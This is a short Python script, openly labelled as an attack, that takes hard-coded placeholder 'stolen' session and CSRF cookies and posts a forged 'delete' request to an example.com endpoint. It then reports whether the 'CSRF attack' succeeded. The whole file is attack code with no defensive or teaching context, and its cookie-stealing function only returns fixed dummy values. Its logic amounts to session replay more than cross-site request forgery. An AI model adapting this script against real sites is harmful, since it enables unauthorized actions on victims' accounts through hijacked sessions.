import requests
from bs4 import BeautifulSoup

def steal_cookies():

    cookies = {
        'session_id': '1234567890abcdef',
        'csrf_token': 'abcdef1234567890',
    }
    return cookies

def csrf_attack(url, cookies):
    form_data = {
        'csrf_token': cookies['csrf_token'],
        'action': 'delete',
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    
    response = requests.post(url, cookies=cookies, data=form_data, headers=headers)
    
    # Check if the attack was successful.
    if response.status_code == 200:
        print("CSRF attack successful!")
    else:
        print("CSRF attack failed.")

url_to_attack = 'http://example.com/action'

stolen_cookies = steal_cookies()

csrf_attack(url_to_attack, stolen_cookies)